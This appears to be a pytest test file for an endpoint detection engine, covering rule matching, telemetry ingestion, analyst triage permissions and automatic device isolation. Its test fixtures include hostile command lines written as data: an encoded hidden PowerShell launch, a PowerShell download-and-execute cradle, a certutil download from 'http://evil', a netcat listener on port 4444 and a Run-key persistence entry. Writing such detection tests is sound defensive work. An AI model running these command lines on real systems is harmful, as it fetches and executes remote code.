"""Tests for M8: the behavioral detection engine and triage API."""
import pytest

from app.core.roles import Role
from app.detection.rules import EventContext, Severity, SEED_RULES
from app.services import auth_service
from tests.conftest import ADMIN_HEADERS

GOOD_PW = "Sup3rSecret!!"


@pytest.fixture(autouse=True)
def _reset_rate_limit():
    auth_service.reset_rate_limit()
    yield
    auth_service.reset_rate_limit()


def _emit(client, headers, **event):
    base = {"severity": "info", "summary": "", "details": {}}
    base.update(event)
    return client.post("/api/agent/telemetry", json={"events": [base]}, headers=headers)


# -- rule unit tests ------------------------------------------------------
def test_reverse_shell_rule_matches_port_kill():
    ctx = EventContext("port_watchdog", "killed", "critical", "killed nc",
                       {"port": 4444, "process": "nc"})
    rule = next(r for r in SEED_RULES if r.id == "reverse_shell")
    assert rule.matches(ctx) and rule.severity == Severity.CRITICAL


def test_powershell_rule_matches_encoded_download():
    ctx = EventContext("process", "exec", "info", "ran ps",
                       {"command_line": "powershell -nop -w hidden -enc SQBFAFgA"})
    ps = next(r for r in SEED_RULES if r.id == "powershell_abuse")
    enc = next(r for r in SEED_RULES if r.id == "encoded_command")
    assert ps.matches(ctx)
    assert enc.matches(ctx)


def test_lolbin_rule_matches_certutil():
    ctx = EventContext("process", "exec", "info", "",
                       {"command_line": "certutil.exe -urlcache -f http://evil/x.exe"})
    lol = next(r for r in SEED_RULES if r.id == "lolbin_execution")
    assert lol.matches(ctx)


def test_benign_event_matches_nothing():
    ctx = EventContext("agent", "heartbeat", "info", "ok", {})
    assert not any(r.matches(ctx) for r in SEED_RULES)


# -- engine integration via telemetry ingestion --------------------------
def test_reverse_shell_telemetry_creates_detection(client, enrolled_device):
    r = _emit(client, enrolled_device["headers"], source="port_watchdog", action="killed",
              severity="critical", summary="killed listener",
              details={"port": 4444, "process": "nc"})
    assert r.json()["detections"] == 1
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    assert len(dets) == 1
    assert dets[0]["rule_id"] == "reverse_shell"
    assert dets[0]["severity"] == "critical"
    assert dets[0]["technique_id"] == "T1059"
    assert dets[0]["status"] == "new"


def test_suspicious_listener_creates_medium_detection(client, enrolled_device):
    _emit(client, enrolled_device["headers"], source="port_watchdog", action="detected",
          severity="warning", summary="new listener", details={"port": 9090, "process": "app"})
    dets = client.get("/api/admin/detections?severity=medium", headers=ADMIN_HEADERS).json()
    assert len(dets) == 1
    assert dets[0]["rule_id"] == "suspicious_listener"


def test_powershell_telemetry_creates_detections(client, enrolled_device):
    _emit(client, enrolled_device["headers"], source="process", action="exec",
          details={"command_line": "powershell -nop iex (New-Object Net.WebClient).DownloadString('http://x')"})
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    rule_ids = {d["rule_id"] for d in dets}
    assert "powershell_abuse" in rule_ids


def test_no_detection_for_benign_telemetry(client, enrolled_device):
    r = _emit(client, enrolled_device["headers"], source="agent", action="heartbeat",
              summary="ok")
    assert r.json()["detections"] == 0
    assert client.get("/api/admin/detections", headers=ADMIN_HEADERS).json() == []


# -- triage + RBAC --------------------------------------------------------
def _login(client, email):
    r = client.post("/api/auth/login", json={"email": email, "password": GOOD_PW})
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def test_ack_and_resolve_transition(client, enrolled_device):
    _emit(client, enrolled_device["headers"], source="port_watchdog", action="killed",
          details={"port": 4444})
    det_id = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()[0]["id"]
    assert client.post(f"/api/admin/detections/{det_id}/ack",
                       headers=ADMIN_HEADERS).json()["status"] == "acknowledged"
    assert client.post(f"/api/admin/detections/{det_id}/resolve",
                       headers=ADMIN_HEADERS).json()["status"] == "resolved"


def test_read_only_cannot_triage(client, enrolled_device, db_session_factory):
    _emit(client, enrolled_device["headers"], source="port_watchdog", action="killed",
          details={"port": 4444})
    det_id = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()[0]["id"]
    db = db_session_factory()
    auth_service.create_user(db, "ro@x.com", GOOD_PW, Role.READ_ONLY.value)
    db.close()
    h = _login(client, "ro@x.com")
    assert client.get("/api/admin/detections", headers=h).status_code == 200  # can read
    assert client.post(f"/api/admin/detections/{det_id}/ack", headers=h).status_code == 403


def test_analyst_can_triage(client, enrolled_device, db_session_factory):
    _emit(client, enrolled_device["headers"], source="port_watchdog", action="killed",
          details={"port": 4444})
    det_id = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()[0]["id"]
    db = db_session_factory()
    auth_service.create_user(db, "analyst@x.com", GOOD_PW, Role.ANALYST.value)
    db.close()
    h = _login(client, "analyst@x.com")
    assert client.post(f"/api/admin/detections/{det_id}/ack", headers=h).status_code == 200


def test_process_telemetry_end_to_end_detections(client, enrolled_device):
    """A real process-monitor-style event drives multiple detections."""
    client.post("/api/agent/telemetry", json={"events": [
        {"source": "process", "action": "exec", "severity": "info",
         "summary": "Process started: powershell",
         "details": {"pid": 900, "ppid": 800, "name": "powershell",
                     "command_line": "powershell -nop -w hidden -enc SQBFAFgA"}},
        {"source": "process", "action": "exec", "severity": "info",
         "summary": "Process started: certutil",
         "details": {"pid": 901, "ppid": 800, "name": "certutil",
                     "command_line": "certutil.exe -urlcache -f http://evil/x.exe"}},
    ]}, headers=enrolled_device["headers"])
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    rule_ids = {d["rule_id"] for d in dets}
    assert {"powershell_abuse", "encoded_command", "lolbin_execution"} <= rule_ids


def test_yara_match_telemetry_creates_detection(client, enrolled_device):
    """A YARA scanner match from the agent creates a critical detection."""
    _emit(client, enrolled_device["headers"], source="yara", action="quarantined",
          severity="critical", summary="YARA rule Malware_Generic matched evil.bin",
          details={"path": "/tmp/evil.bin", "rules": ["Malware_Generic"]})
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    hits = [d for d in dets if d["rule_id"] == "yara_match"]
    assert len(hits) == 1
    assert hits[0]["severity"] == "critical"
    assert hits[0]["technique_id"] == "T1105"


def test_registry_autorun_creates_persistence_detection(client, enrolled_device):
    """A registry autorun event from the agent fires the persistence rule."""
    _emit(client, enrolled_device["headers"], source="registry_monitor",
          action="autorun_added", severity="warning",
          summary=r"Registry autorun added: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Evil -> C:\temp\evil.exe",
          details={"key": r"HKCU\...\CurrentVersion\Run", "name": "Evil",
                   "command_line": r"C:\temp\evil.exe"})
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    hits = [d for d in dets if d["rule_id"] == "registry_persistence"]
    assert len(hits) == 1
    assert hits[0]["technique_id"] == "T1547.001"


def test_suricata_alert_creates_detection(client, enrolled_device):
    """A Suricata IDS alert forwarded by the agent creates a high detection."""
    _emit(client, enrolled_device["headers"], source="suricata", action="alert",
          severity="warning", summary="Suricata alert: ET MALWARE Cobalt Strike",
          details={"signature": "ET MALWARE Cobalt Strike", "signature_id": 2027,
                   "src_ip": "10.0.0.5", "dest_ip": "10.0.0.9"})
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    hits = [d for d in dets if d["rule_id"] == "suricata_alert"]
    assert len(hits) == 1
    assert hits[0]["severity"] == "high"
    assert hits[0]["technique_id"] == "T1071"


def test_auto_isolate_response_when_enabled(client, enrolled_device, monkeypatch):
    from app.core.config import settings
    monkeypatch.setattr(settings, "detection_auto_isolate", True)
    _emit(client, enrolled_device["headers"], source="port_watchdog", action="killed",
          severity="critical", details={"port": 4444})
    device = client.get("/api/admin/devices", headers=ADMIN_HEADERS).json()
    match = next(d for d in device if d["id"] == enrolled_device["device_id"])
    assert match["isolated"] is True
